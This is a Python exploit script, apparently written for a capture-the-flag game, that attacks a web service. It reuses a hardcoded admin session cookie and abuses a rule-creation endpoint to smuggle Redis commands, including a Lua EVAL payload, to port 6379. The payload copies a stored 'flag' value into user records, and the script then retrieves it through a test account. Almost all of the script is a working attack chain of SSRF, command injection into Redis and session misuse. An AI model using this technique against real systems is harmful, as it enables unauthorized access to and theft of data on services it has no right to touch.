#!/usr/bin/env python3

import sys
import requests
import secrets
import time

s = requests.session()

url = 'http://localhost:8080' if len(sys.argv) < 2 else sys.argv[1]

admin_cookie = 'z9kxrWtxtyUH+82+9yEacnJzjrZvemdtOy/ioNoUP/k='
rule_name = secrets.token_hex(16)
print(f'{rule_name=}')

resp = s.get(url + '/api/user/me', cookies={'vapor-session': admin_cookie})
print(resp.status_code)
print(resp.text)

resp = s.get(url + '/api/user/me')
print(resp.status_code)
print(resp.text)

s1 = requests.session()
s1.post(url + '/api/user/register', json={'login': 'test', 'password': 'test'})
s1.post(url + '/api/user/login', json={'login': 'test', 'password': 'test'})

sploit_method = r'''"EVAL" "\n    local result = redis.call(\"SCAN\", 0)\n    local keys = result[2]\n    local flag = redis.call(\"GET\", \"flag\")\n\n    for i, key in ipairs(keys) do\n        local value = redis.call(\"GET\", key)\n        if value and string.find(value, \"test\") then\n            local newValue = string.gsub(value, \"test\", flag)\n            redis.call(\"SET\", key, newValue)\n        end\n    end\n" 0
SET redis_test 123
GET redis_test
'''

resp = s.post(url + '/beta/fbi/rule', json={'method': sploit_method, 'url': ':6379', 'name': rule_name})
print(resp.status_code)
print(resp.text)

important_chat = '__test_emergency_chat'
s.post(url + '/api/chat/add', json={'user': 'test', 'chat': important_chat})
s.post(url + '/api/chat/send', json={'content': f'/user {rule_name} 1', 'chat': important_chat, 'from': '', 'replyTo': '', 'id': '', 'important': ''})

resp = s1.get(url + '/api/user/me')
print(resp.status_code)
print(resp.text)

time.sleep(10)
resp = s1.get(url + '/api/user/me')
print(resp.status_code)
print(resp.text)
